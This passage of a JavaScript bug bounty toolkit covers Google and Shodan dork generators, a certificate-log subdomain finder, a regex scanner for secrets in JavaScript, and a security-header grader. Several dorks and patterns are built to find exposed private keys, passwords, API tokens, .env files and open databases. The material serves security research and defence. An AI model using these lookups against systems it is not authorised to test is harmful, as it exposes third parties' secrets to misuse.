/* ============================================================
   HackTools - Bug Bounty Toolkit
   Vanilla JS, single-file app
   ============================================================ */

// ===== Helpers =====
const $ = (sel, root = document) => root.querySelector(sel);
const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
const el = (tag, attrs = {}, children = []) => {
  const e = document.createElement(tag);
  Object.entries(attrs).forEach(([k, v]) => {
    if (k === 'class') e.className = v;
    else if (k === 'html') e.innerHTML = v;
    else if (k.startsWith('on')) e.addEventListener(k.slice(2), v);
    else e.setAttribute(k, v);
  });
  (Array.isArray(children) ? children : [children]).forEach(c => {
    if (c == null) return;
    e.appendChild(typeof c === 'string' ? document.createTextNode(c) : c);
  });
  return e;
};

const escapeHtml = (s) => String(s).replace(/[&<>"']/g, m => ({
  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
}[m]));

const toast = (msg) => {
  const t = $('#toast');
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => t.classList.remove('show'), 1800);
};

const copy = async (text) => {
  try {
    await navigator.clipboard.writeText(text);
    toast('Copied to clipboard');
  } catch {
    toast('Copy failed');
  }
};

const download = (filename, content, mime = 'text/plain') => {
  const blob = new Blob([content], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
};

// ============================================================
// TOOLS REGISTRY
// ============================================================
const TOOLS = {};

// ===== 1. GOOGLE DORK GENERATOR =====
TOOLS['google-dork'] = {
  title: 'Google Dork Generator',
  desc: 'Generate common Google dork queries for a target domain',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Target</div>
          <div class="field">
            <label>Domain (e.g., example.com)</label>
            <input type="text" id="gd-domain" placeholder="example.com">
          </div>
          <button class="btn" id="gd-gen">Generate Dorks</button>
        </div>
        <div class="card" id="gd-results" style="display:none">
          <div class="result-header">
            <h4>Generated Dorks</h4>
            <button class="btn btn-ghost" id="gd-copy-all">Copy All</button>
          </div>
          <div class="dork-list" id="gd-list"></div>
        </div>
      </div>
    `;
  },
  init() {
    const gen = () => {
      const d = $('#gd-domain').value.trim();
      if (!d) return toast('Enter a domain');
      const dorks = TOOLS['google-dork']._build(d);
      const list = $('#gd-list');
      list.innerHTML = '';
      dorks.forEach(([q, desc]) => {
        const item = el('div', { class: 'dork-item' });
        const wrap = el('div', { class: 'dork-item-wrap' });
        wrap.innerHTML = `<span class="desc">${escapeHtml(desc)}</span><code>${escapeHtml(q)}</code>`;
        item.appendChild(wrap);
        const cBtn = el('button', { class: 'btn btn-ghost', onclick: () => copy(q) }, 'Copy');
        const oBtn = el('button', { class: 'btn btn-ghost', onclick: () => window.open('https://www.google.com/search?q=' + encodeURIComponent(q), '_blank') }, 'Open');
        item.appendChild(cBtn);
        item.appendChild(oBtn);
        list.appendChild(item);
      });
      $('#gd-results').style.display = 'block';
    };
    $('#gd-gen').addEventListener('click', gen);
    $('#gd-domain').addEventListener('keydown', e => e.key === 'Enter' && gen());
    $('#gd-copy-all').addEventListener('click', () => {
      const d = $('#gd-domain').value.trim();
      const all = TOOLS['google-dork']._build(d).map(([q]) => q).join('\n');
      copy(all);
    });
  },
  _build(d) {
    return [
      [`site:${d}`, 'All indexed pages'],
      [`site:*.${d}`, 'Subdomains'],
      [`site:${d} -www`, 'Excluding www'],
      [`site:${d} (ext:env OR ext:log OR ext:bak OR ext:old OR ext:backup OR ext:sql OR ext:conf OR ext:cfg OR ext:ini OR ext:yml OR ext:yaml OR ext:json OR ext:xml OR ext:txt) OR (intitle:"index of" OR intitle:"phpinfo()" OR intext:"DB_PASSWORD" OR intext:"api_key" OR intext:"BEGIN RSA PRIVATE KEY" OR "fatal error" OR "stack trace")`, 'All-in-one Information Disclosure'],
      [`site:${d} ext:php`, 'PHP files'],
      [`site:${d} ext:asp OR ext:aspx OR ext:jsp`, 'Server-side files'],
      [`site:${d} ext:txt OR ext:log OR ext:bak OR ext:old OR ext:backup`, 'Text/backup files'],
      [`site:${d} ext:xml OR ext:conf OR ext:cnf OR ext:cfg OR ext:ini`, 'Config files'],
      [`site:${d} ext:sql OR ext:dbf OR ext:mdb`, 'Database files'],
      [`site:${d} ext:doc OR ext:docx OR ext:pdf OR ext:xls OR ext:xlsx OR ext:ppt OR ext:pptx`, 'Documents'],
      [`site:${d} ext:env OR ext:yml OR ext:yaml OR ext:json`, 'Environment files'],
      [`site:${d} inurl:admin`, 'Admin panels'],
      [`site:${d} inurl:login OR inurl:signin OR inurl:auth`, 'Login pages'],
      [`site:${d} inurl:register OR inurl:signup OR inurl:sign-up OR inurl:registration OR inurl:create-account`, 'Register / signup pages'],
      [`site:${d} inurl:dashboard`, 'Dashboards'],
      [`site:${d} inurl:wp-content OR inurl:wp-admin`, 'WordPress paths'],
      [`site:${d} inurl:api OR inurl:v1 OR inurl:v2 OR inurl:v3`, 'API endpoints'],
      [`site:${d} inurl:test OR inurl:dev OR inurl:staging OR inurl:beta`, 'Dev environments'],
      [`site:${d} inurl:debug`, 'Debug pages'],
      [`site:${d} inurl:redirect OR inurl:url= OR inurl:next= OR inurl:return=`, 'Open redirect candidates'],
      [`site:${d} inurl:?id= OR inurl:?cat= OR inurl:?page= OR inurl:?file=`, 'Param-driven URLs (SQLi/LFI)'],
      [`site:${d} intitle:"index of"`, 'Directory listings'],
      [`site:${d} intitle:"phpinfo()"`, 'phpinfo pages'],
      [`site:${d} "sql syntax near" OR "syntax error has occurred"`, 'SQL errors'],
      [`site:${d} "Warning: include" OR "Warning: require"`, 'PHP errors / LFI hints'],
      [`site:${d} "fatal error" OR "stack trace"`, 'Stack traces'],
      [`site:${d} intext:"password" OR intext:"passwd"`, 'Password mentions'],
      [`site:${d} "BEGIN RSA PRIVATE KEY"`, 'Private keys'],
      [`site:pastebin.com "${d}"`, 'Pastebin leaks'],
      [`site:github.com "${d}"`, 'GitHub mentions'],
      [`site:trello.com "${d}"`, 'Trello leaks'],
      [`site:s3.amazonaws.com "${d}"`, 'AWS S3 buckets'],
      [`site:blob.core.windows.net "${d}"`, 'Azure Blob Storage'],
      [`site:storage.googleapis.com "${d}"`, 'Google Cloud Storage buckets'],
      [`site:firebasestorage.googleapis.com "${d}"`, 'Firebase Storage'],
      [`site:digitaloceanspaces.com "${d}"`, 'DigitalOcean Spaces'],
      [`site:drive.google.com "${d}"`, 'Public Google Drive files'],
      [`site:docs.google.com "${d}"`, 'Public Google Docs / Sheets / Slides'],
      [`site:onedrive.live.com "${d}"`, 'Public OneDrive files'],
      [`site:1drv.ms "${d}"`, 'OneDrive shortlinks'],
      [`site:dropbox.com "${d}"`, 'Public Dropbox files'],
      [`site:box.com "${d}"`, 'Public Box files'],
      [`site:mega.nz "${d}"`, 'Public MEGA files'],
      [`site:icloud.com "${d}"`, 'Public iCloud shares'],
    ];
  }
};

// ===== 2. SHODAN DORK GENERATOR =====
TOOLS['shodan-dork'] = {
  title: 'Shodan Dork Generator',
  desc: 'Generate Shodan queries by domain, IP, or organization',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Target</div>
          <div class="field-row">
            <div class="field">
              <label>Domain</label>
              <input type="text" id="sd-domain" placeholder="example.com">
            </div>
            <div class="field">
              <label>IP / CIDR</label>
              <input type="text" id="sd-ip" placeholder="1.2.3.4 or 1.2.3.0/24">
            </div>
          </div>
          <div class="field-row">
            <div class="field">
              <label>Organization</label>
              <input type="text" id="sd-org" placeholder="Acme Corp">
            </div>
            <div class="field">
              <label>SSL/Certificate Name</label>
              <input type="text" id="sd-ssl" placeholder="example.com">
            </div>
          </div>
          <button class="btn" id="sd-gen">Generate Queries</button>
        </div>
        <div class="card" id="sd-results" style="display:none">
          <div class="result-header"><h4>Shodan Queries</h4></div>
          <div class="dork-list" id="sd-list"></div>
        </div>
      </div>
    `;
  },
  init() {
    $('#sd-gen').addEventListener('click', () => {
      const d = $('#sd-domain').value.trim();
      const ip = $('#sd-ip').value.trim();
      const org = $('#sd-org').value.trim();
      const ssl = $('#sd-ssl').value.trim();
      const queries = [];

      if (d) {
        queries.push([`hostname:"${d}"`, 'Hosts matching domain']);
        queries.push([`ssl:"${d}"`, 'SSL cert matches domain']);
        queries.push([`ssl.cert.subject.cn:"${d}"`, 'Cert CN matches']);
        queries.push([`http.title:"${d}"`, 'HTTP title contains domain']);
      }
      if (ip) {
        queries.push([`net:${ip}`, 'IP / CIDR range']);
        queries.push([`net:${ip} port:80,443,8080,8443`, 'Web ports on range']);
      }
      if (org) {
        queries.push([`org:"${org}"`, 'By organization']);
        queries.push([`org:"${org}" port:22`, 'SSH on org']);
        queries.push([`org:"${org}" port:3389`, 'RDP on org']);
        queries.push([`org:"${org}" "default password"`, 'Default password mentions']);
      }
      if (ssl) {
        queries.push([`ssl.cert.subject.cn:"${ssl}"`, 'SSL CN match']);
        queries.push([`ssl.cert.issuer.cn:"${ssl}"`, 'SSL issuer CN match']);
      }

      // Generic useful queries
      queries.push([`product:"nginx" "200 OK"`, 'nginx servers']);
      queries.push([`product:"Apache" country:"US"`, 'Apache in US']);
      queries.push([`"Server: Microsoft-IIS"`, 'IIS servers']);
      queries.push([`port:9200 elastic`, 'Open Elasticsearch']);
      queries.push([`port:27017 mongodb`, 'Open MongoDB']);
      queries.push([`port:6379 redis`, 'Open Redis']);
      queries.push([`"X-Jenkins" "Set-Cookie: JSESSIONID"`, 'Jenkins panels']);
      queries.push([`title:"Grafana"`, 'Grafana']);
      queries.push([`title:"Kibana"`, 'Kibana']);

      const list = $('#sd-list');
      list.innerHTML = '';
      queries.forEach(([q, desc]) => {
        const item = el('div', { class: 'dork-item' });
        const wrap = el('div', { class: 'dork-item-wrap' });
        wrap.innerHTML = `<span class="desc">${escapeHtml(desc)}</span><code>${escapeHtml(q)}</code>`;
        item.appendChild(wrap);
        item.appendChild(el('button', { class: 'btn btn-ghost', onclick: () => copy(q) }, 'Copy'));
        item.appendChild(el('button', { class: 'btn btn-ghost', onclick: () => window.open('https://www.shodan.io/search?query=' + encodeURIComponent(q), '_blank') }, 'Open'));
        list.appendChild(item);
      });
      $('#sd-results').style.display = 'block';
    });
  }
};

// ===== 3. SUBDOMAIN FINDER =====
TOOLS['subdomain-finder'] = {
  title: 'Subdomain Finder',
  desc: 'Find subdomains using crt.sh certificate transparency logs',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Target Domain</div>
          <div class="field">
            <label>Root domain (e.g., example.com)</label>
            <input type="text" id="sf-domain" placeholder="example.com">
          </div>
          <button class="btn" id="sf-search">Search Subdomains</button>
          <span id="sf-timer" style="margin-left:12px;color:var(--text-mute);font-size:12px">Uses crt.sh - may take 10–30s</span>
        </div>
        <div class="card" id="sf-results" style="display:none">
          <div class="result-header">
            <h4>Subdomains <span id="sf-count" style="color:var(--text-mute);font-weight:400"></span></h4>
            <div>
              <button class="btn btn-ghost" id="sf-copy">Copy</button>
              <button class="btn btn-ghost" id="sf-download">Download</button>
            </div>
          </div>
          <div class="result-box" id="sf-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    const formatElapsed = (ms) => {
      const s = ms / 1000;
      return s < 10 ? s.toFixed(1) + 's' : Math.round(s) + 's';
    };

    $('#sf-search').addEventListener('click', async () => {
      const d = $('#sf-domain').value.trim();
      if (!d) return toast('Enter a domain');
      const btn = $('#sf-search');
      const timerEl = $('#sf-timer');
      btn.disabled = true;
      btn.textContent = 'Searching...';

      // Live count-up timer while crt.sh is being queried
      const start = performance.now();
      timerEl.style.color = 'var(--accent)';
      timerEl.textContent = 'Collecting subdomains... 0.0s';
      const tick = setInterval(() => {
        timerEl.textContent = `Collecting subdomains... ${formatElapsed(performance.now() - start)}`;
      }, 100);

      try {
        const res = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(d)}&output=json`);
        if (!res.ok) throw new Error('crt.sh request failed');
        const data = await res.json();
        const subs = new Set();
        data.forEach(entry => {
          (entry.name_value || '').split('\n').forEach(n => {
            n = n.trim().toLowerCase().replace(/^\*\./, '');
            if (n.endsWith(d.toLowerCase())) subs.add(n);
          });
        });
        const sorted = [...subs].sort();
        const elapsed = formatElapsed(performance.now() - start);
        $('#sf-output').textContent = sorted.join('\n');
        $('#sf-count').textContent = `(${sorted.length} found in ${elapsed})`;
        $('#sf-results').style.display = 'block';
        TOOLS['subdomain-finder']._last = sorted;
        clearInterval(tick);
        timerEl.style.color = 'var(--success)';
        timerEl.textContent = `Subdomains collected in ${elapsed} (${sorted.length} found)`;
      } catch (e) {
        clearInterval(tick);
        timerEl.style.color = 'var(--danger)';
        timerEl.textContent = `Failed after ${formatElapsed(performance.now() - start)}`;
        toast('Error: ' + e.message + ' (CORS may block - try a CORS proxy)');
      } finally {
        btn.disabled = false;
        btn.textContent = 'Search Subdomains';
      }
    });
    $('#sf-copy').addEventListener('click', () => copy((TOOLS['subdomain-finder']._last || []).join('\n')));
    $('#sf-download').addEventListener('click', () => {
      const d = $('#sf-domain').value.trim() || 'subdomains';
      download(`${d}-subdomains.txt`, (TOOLS['subdomain-finder']._last || []).join('\n'));
    });
  }
};

// ===== 4. JS FILE ANALYZER =====
TOOLS['js-analyzer'] = {
  title: 'JS File Analyzer',
  desc: 'Extract endpoints, secrets, and interesting strings from JavaScript',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">JavaScript Source</div>
          <div class="field">
            <label>Paste JS source code (Right Click -> View Page Source or CTRL + U)</label>
            <textarea id="js-input" rows="10" placeholder="// paste js source here..."></textarea>
          </div>
          <button class="btn" id="js-analyze">Analyze</button>
        </div>
        <div id="js-results"></div>
      </div>
    `;
  },
  init() {
    $('#js-analyze').addEventListener('click', () => {
      const src = $('#js-input').value;
      if (!src) return toast('Paste some JS first');

      const findings = {
        URLs: [...new Set(src.match(/https?:\/\/[^\s'"`<>()]+/g) || [])],
        'Relative paths': [...new Set(src.match(/['"`]\/[a-zA-Z0-9_\-\/.?=&]+['"`]/g) || [])].map(s => s.slice(1, -1)),
        'API endpoints': [...new Set(src.match(/['"`]\/?(api|v[0-9]+|graphql|rest)\/[a-zA-Z0-9_\-\/.?=&]+['"`]/gi) || [])].map(s => s.slice(1, -1)),
        'AWS Access Keys': [...new Set(src.match(/AKIA[0-9A-Z]{16}/g) || [])],
        'AWS Secret Keys': [...new Set(src.match(/(?<![A-Za-z0-9\/+=])[A-Za-z0-9\/+=]{40}(?![A-Za-z0-9\/+=])/g) || [])].slice(0, 5),
        'Google API keys': [...new Set(src.match(/AIza[0-9A-Za-z\-_]{35}/g) || [])],
        'Slack tokens': [...new Set(src.match(/xox[baprs]-[0-9a-zA-Z\-]+/g) || [])],
        'Bearer tokens': [...new Set(src.match(/[Bb]earer\s+[A-Za-z0-9\-._~+\/]+=*/g) || [])],
        'JWT tokens': [...new Set(src.match(/eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g) || [])],
        'Private keys': [...new Set(src.match(/-----BEGIN [A-Z ]+PRIVATE KEY-----/g) || [])],
        'Email addresses': [...new Set(src.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])],
        'IP addresses': [...new Set(src.match(/\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/g) || [])],
        'S3 buckets': [...new Set(src.match(/[a-z0-9.\-]+\.s3[.\-][a-z0-9\-]*\.amazonaws\.com/g) || [])],
        'Firebase URLs': [...new Set(src.match(/[a-z0-9\-]+\.firebaseio\.com/g) || [])],
        'API key patterns': [...new Set(src.match(/(?:api[_-]?key|apikey|secret|token|password|passwd|pwd)\s*[:=]\s*['"`][^'"`]{8,}['"`]/gi) || [])],
        'DOM sinks': [...new Set(src.match(/\.(innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval|setTimeout|setInterval|Function)\b/g) || [])],
      };

      const out = $('#js-results');
      out.innerHTML = '';
      Object.entries(findings).forEach(([k, v]) => {
        if (!v.length) return;
        const card = el('div', { class: 'card' });
        card.innerHTML = `<div class="card-title">${escapeHtml(k)} (${v.length})</div><div class="result-box">${v.map(escapeHtml).join('\n')}</div>`;
        out.appendChild(card);
      });
      if (!out.children.length) {
        out.innerHTML = '<div class="card"><div class="card-title">No findings</div><p style="color:var(--text-mute);font-size:13px">Nothing interesting found in the source.</p></div>';
      }
    });
  }
};

// ===== 5. SECURITY HEADER ANALYZER =====
TOOLS['header-analyzer'] = {
  title: 'Security Header Analyzer',
  desc: 'Analyze HTTP response headers for security misconfigurations',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Fetch from URL <span style="color:var(--text-mute);font-weight:400;font-size:11px">(experimental)</span></div>
          <div class="field">
            <label>Domain or URL</label>
            <input type="text" id="hdr-url" placeholder="example.com or https://example.com">
          </div>
          <button class="btn" id="hdr-fetch">Fetch &amp; Analyze</button>
          <div id="hdr-fetch-status" style="margin-top:8px;font-size:12px;color:var(--text-mute)"></div>
        </div>
        <div class="card">
          <div class="card-title">HTTP Response Headers</div>
          <div class="field">
            <label>Paste raw response headers</label>
            <textarea id="hdr-input" rows="12" placeholder="HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html
..."></textarea>
          </div>
          <button class="btn" id="hdr-analyze">Analyze Headers</button>
        </div>
        <div class="card" id="hdr-grade-card" style="display:none">
          <div class="grade-dual">
            <div class="grade-wrap">
              <div class="grade-letter" id="hdr-grade">?</div>
              <div class="grade-meta">
                <div class="grade-label-top">Security Headers</div>
                <div class="grade-label" id="hdr-grade-label">-</div>
                <div class="grade-bar"><div class="grade-bar-fill" id="hdr-grade-bar"></div></div>
                <div class="grade-score" id="hdr-grade-score">0 / 6 core headers</div>
              </div>
            </div>
            <div class="grade-wrap">
              <div class="grade-letter" id="hdr-grade2">?</div>
              <div class="grade-meta">
                <div class="grade-label-top">Hardening &amp; Hygiene</div>
                <div class="grade-label" id="hdr-grade2-label">-</div>
                <div class="grade-bar"><div class="grade-bar-fill" id="hdr-grade2-bar"></div></div>
                <div class="grade-score" id="hdr-grade2-score">0 issues</div>
              </div>
            </div>
          </div>
          <p class="grade-note">
            <strong>Note:</strong> two grades are reported.
            <em>Security Headers</em> follows securityheaders.com - it scores the 6 core
            response headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options,
            Referrer-Policy, Permissions-Policy).
            <em>Hardening &amp; Hygiene</em> is an additional check most providers skip:
            information leaks (Server, X-Powered-By, etc.) and weak cookie flags
            (missing HttpOnly / Secure / SameSite).
          </p>
        </div>
        <div class="card" id="hdr-results" style="display:none">
          <div class="result-header"><h4>Analysis</h4></div>
          <div class="header-result" id="hdr-output"></div>
        </div>
        <div class="card" id="hdr-recs-card" style="display:none">
          <div class="result-header">
            <h4>Recommendations <span id="hdr-recs-count" style="color:var(--text-mute);font-weight:400"></span></h4>
            <button class="btn btn-secondary" id="hdr-recs-toggle">Show More Info</button>
          </div>
          <div id="hdr-recs" style="display:none"></div>
        </div>
      </div>
    `;
  },
  init() {
    // securityheaders.com scoring: 6 core headers, grade dropped per missing.
    // A+ requires all present AND strong HSTS + safe CSP.
    const checks = [
      { name: 'Strict-Transport-Security', desc: 'Forces HTTPS' },
      { name: 'Content-Security-Policy',   desc: 'Mitigates XSS / data injection' },
      { name: 'X-Frame-Options',           desc: 'Mitigates clickjacking' },
      { name: 'X-Content-Type-Options',    desc: 'Should be "nosniff"' },
      { name: 'Referrer-Policy',           desc: 'Controls referrer info' },
      { name: 'Permissions-Policy',        desc: 'Restricts browser features' },
    ];
    const leaks = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version', 'Via'];

    // ===== Recommendation database =====
    const RECS = {
      'Strict-Transport-Security': {
        what: 'HSTS forces browsers to use HTTPS for all future connections, preventing protocol downgrade and SSL stripping attacks.',
        fix: 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
        notes: 'Use a max-age of at least 1 year (31536000 seconds). Add "preload" only if you intend to submit to the HSTS preload list.',
        refs: [
          ['MDN - Strict-Transport-Security', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security'],
          ['OWASP HSTS Cheat Sheet', 'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html'],
          ['HSTS Preload List', 'https://hstspreload.org/'],
        ]
      },
      'Content-Security-Policy': {
        what: 'CSP restricts which resources (scripts, styles, frames, etc.) the browser is allowed to load, mitigating XSS and data injection.',
        fix: "Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'",
        notes: "Avoid 'unsafe-inline' and 'unsafe-eval'. Prefer nonces or hashes for inline scripts. Always set frame-ancestors to also cover clickjacking.",
        refs: [
          ['MDN - Content-Security-Policy', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy'],
          ['OWASP CSP Cheat Sheet', 'https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html'],
          ['CSP Evaluator (Google)', 'https://csp-evaluator.withgoogle.com/'],
        ]
      },
      'X-Frame-Options': {
        what: 'Prevents your page from being rendered inside an <iframe> on another origin, mitigating clickjacking attacks.',
        fix: 'X-Frame-Options: DENY',
        notes: 'Use DENY unless you specifically need framing on the same origin (then use SAMEORIGIN). Modern alternative: "frame-ancestors \'none\'" inside CSP.',
        refs: [
          ['MDN - X-Frame-Options', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options'],
          ['OWASP Clickjacking Defense Cheat Sheet', 'https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html'],
        ]
      },
      'X-Content-Type-Options': {
        what: 'Prevents the browser from MIME-sniffing a response away from the declared Content-Type, blocking some XSS and content-confusion attacks.',
        fix: 'X-Content-Type-Options: nosniff',
        notes: 'The only valid value is "nosniff". Anything else is treated as missing.',
        refs: [
          ['MDN - X-Content-Type-Options', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options'],
        ]
      },
      'Referrer-Policy': {
        what: 'Controls how much referrer information is sent with cross-origin requests, preventing leakage of sensitive URLs / tokens.',
        fix: 'Referrer-Policy: strict-origin-when-cross-origin',
        notes: 'For maximum privacy use "no-referrer". "strict-origin-when-cross-origin" is the modern default and a good balance.',
        refs: [
          ['MDN - Referrer-Policy', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy'],
          ['Web.dev - Referrer-Policy', 'https://web.dev/articles/referrer-best-practices'],
        ]
      },
      'Permissions-Policy': {
        what: 'Allows or denies access to powerful browser features (camera, microphone, geolocation, etc.) for the page and any embedded content.',
        fix: 'Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()',
        notes: 'Disable everything you don\'t use. Replaces the older Feature-Policy header.',
        refs: [
          ['MDN - Permissions-Policy', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy'],
          ['W3C Permissions Policy Spec', 'https://www.w3.org/TR/permissions-policy/'],
        ]
      },
      'Information-Leak': {
        what: 'Headers like Server, X-Powered-By, X-AspNet-Version reveal the server software and version, helping attackers fingerprint your stack and find known CVEs.',
        fix: 'Remove or obfuscate these headers in your web server / framework configuration.',
        notes: 'Nginx: "server_tokens off;" - Apache: "ServerTokens Prod" + "ServerSignature Off" - Express: "app.disable(\'x-powered-by\')" - IIS: remove via web.config.',
        refs: [
          ['OWASP Secure Headers Project', 'https://owasp.org/www-project-secure-headers/'],
          ['Nginx server_tokens', 'https://nginx.org/en/docs/http/ngx_http_core_module.html#server_tokens'],
        ]
      },
      'Cookie-Flags': {
        what: 'Cookies missing HttpOnly, Secure, or SameSite are vulnerable to theft via XSS, MITM over HTTP, and CSRF.',
        fix: 'Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/',
        notes: 'HttpOnly = blocks JS access (anti-XSS). Secure = HTTPS only. SameSite=Lax (or Strict) = anti-CSRF. Use SameSite=None only if you really need cross-site cookies, and always with Secure.',
        refs: [
          ['MDN - Set-Cookie', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie'],
          ['OWASP Session Management Cheat Sheet', 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html'],
        ]
      },
    };

    const renderRec = (title, statusText, rec) => {
      const refsHtml = rec.refs.map(([t, u]) => `<a href="${escapeHtml(u)}" target="_blank" rel="noopener">${escapeHtml(t)}</a>`).join('');
      return `
        <div class="rec">
          <div class="rec-head">
            <span class="rec-title">${escapeHtml(title)}</span>
            <span class="h-status h-fail">${escapeHtml(statusText)}</span>
          </div>
          <div class="rec-body">
            <p class="rec-what">${escapeHtml(rec.what)}</p>
            <div class="rec-section-label">Recommended fix</div>
            <div class="rec-code">${escapeHtml(rec.fix)}</div>
            <p class="rec-notes">${escapeHtml(rec.notes)}</p>
            <div class="rec-section-label">References</div>
            <div class="rec-refs">${refsHtml}</div>
          </div>
        </div>
      `;
    };

    $('#hdr-analyze').addEventListener('click', () => {
      const raw = $('#hdr-input').value;
      if (!raw) return toast('Paste some headers');
      const headers = {};
      raw.split(/\r?\n/).forEach(line => {
        const m = line.match(/^([^:]+):\s*(.*)$/);
        if (m) headers[m[1].trim().toLowerCase()] = m[2].trim();
      });

      const out = $('#hdr-output');
      out.innerHTML = '';

      let presentCount = 0;
      let cspWarn = false;
      let hstsWarn = false;
      let xctoWarn = false;
      const issuesList = []; // for recommendations

      checks.forEach(c => {
        const val = headers[c.name.toLowerCase()];
        let status, statusText, detail;
        if (val) {
          status = 'h-pass'; statusText = 'PRESENT'; detail = val;
          presentCount++;
          if (c.name === 'X-Content-Type-Options' && val.toLowerCase() !== 'nosniff') {
            status = 'h-warn'; statusText = 'WEAK'; xctoWarn = true;
            issuesList.push({ key: c.name, title: c.name, status: 'WEAK' });
          }
          if (c.name === 'Strict-Transport-Security') {
            const m = val.match(/max-age=(\d+)/i);
            const age = m ? parseInt(m[1]) : 0;
            if (age < 31536000 || !/includeSubDomains/i.test(val)) {
              status = 'h-warn'; statusText = 'WEAK';
              detail += ' (needs max-age ≥ 31536000 + includeSubDomains for A+)';
              hstsWarn = true;
              issuesList.push({ key: c.name, title: c.name, status: 'WEAK' });
            }
          }
          if (c.name === 'Content-Security-Policy' && /unsafe-inline|unsafe-eval/i.test(val)) {
            status = 'h-warn'; statusText = 'WEAK';
            detail += ' (uses unsafe-inline / unsafe-eval)';
            cspWarn = true;
            issuesList.push({ key: c.name, title: c.name, status: 'WEAK' });
          }
        } else {
          status = 'h-fail';
          statusText = 'MISSING';
          detail = c.desc;
          issuesList.push({ key: c.name, title: c.name, status: 'MISSING' });
        }
        const row = el('div', { class: 'header-row' });
        row.innerHTML = `
          <span class="h-name">${escapeHtml(c.name)}</span>
          <span class="h-detail">${escapeHtml(detail)}</span>
          <span class="h-status ${status}">${statusText}</span>
        `;
        out.appendChild(row);
      });

      // Information leaks - affect grade
      let leakCount = 0;
      const leaksFound = [];
      leaks.forEach(name => {
        const val = headers[name.toLowerCase()];
        if (val) {
          leakCount++;
          leaksFound.push(name);
          const row = el('div', { class: 'header-row' });
          row.innerHTML = `
            <span class="h-name">${escapeHtml(name)}</span>
            <span class="h-detail">Information disclosure: ${escapeHtml(val)}</span>
            <span class="h-status h-warn">LEAK</span>
          `;
          out.appendChild(row);
        }
      });
      if (leakCount) {
        issuesList.push({ key: 'Information-Leak', title: `Information leak: ${leaksFound.join(', ')}`, status: 'LEAK' });
      }

      // Cookie flags - affect grade (count each missing flag)
      let cookieMissCount = 0;
      const cookieIssues = [];
      const setCookies = raw.split(/\r?\n/).filter(l => /^set-cookie:/i.test(l));
      setCookies.forEach(c => {
        const flags = ['HttpOnly', 'Secure', 'SameSite'];
        const missing = flags.filter(f => !new RegExp(f, 'i').test(c));
        if (missing.length) {
          cookieMissCount += missing.length;
          cookieIssues.push(missing.join(', '));
          const row = el('div', { class: 'header-row' });
          row.innerHTML = `
            <span class="h-name">Set-Cookie</span>
            <span class="h-detail">Missing flags: ${missing.join(', ')}</span>
            <span class="h-status h-warn">WEAK</span>
          `;
          out.appendChild(row);
        }
      });
      if (cookieMissCount) {
        const uniq = [...new Set(cookieIssues.flatMap(s => s.split(', ')))];
        issuesList.push({ key: 'Cookie-Flags', title: `Cookie flags missing: ${uniq.join(', ')}`, status: 'WEAK' });
      }

      // ===== Grade 1: Security Headers (securityheaders.com style) =====
      const missingCount = checks.length - presentCount;
      const order = ['A+', 'A', 'B', 'C', 'D', 'E', 'F'];
      let idx;
      if (missingCount === 0) idx = 1;        // A
      else if (missingCount === 1) idx = 2;   // B
      else if (missingCount === 2) idx = 3;   // C
      else if (missingCount === 3) idx = 4;   // D
      else if (missingCount === 4) idx = 5;   // E
      else idx = 6;                           // F
      // A+: all 6 present AND strong HSTS AND safe CSP AND nosniff valid
      if (idx === 1 && !hstsWarn && !cspWarn && !xctoWarn) idx = 0;
      const grade = order[idx];

      const labels = {
        'A+': 'Outstanding - all headers configured strongly',
        'A':  'Excellent - all main headers present',
        'B':  'Good - one important header missing',
        'C':  'Average - two important headers missing',
        'D':  'Poor - three important headers missing',
        'E':  'Bad - four important headers missing',
        'F':  'Failing - five or more headers missing',
      };
      const gradeKey = grade === 'A+' ? 'Aplus' : grade;
      const gradeEl = $('#hdr-grade');
      gradeEl.textContent = grade;
      gradeEl.className = 'grade-letter grade-' + gradeKey;
      $('#hdr-grade-label').textContent = labels[grade];
      $('#hdr-grade-score').textContent = `${presentCount} / ${checks.length} core headers present`;
      const bar = $('#hdr-grade-bar');
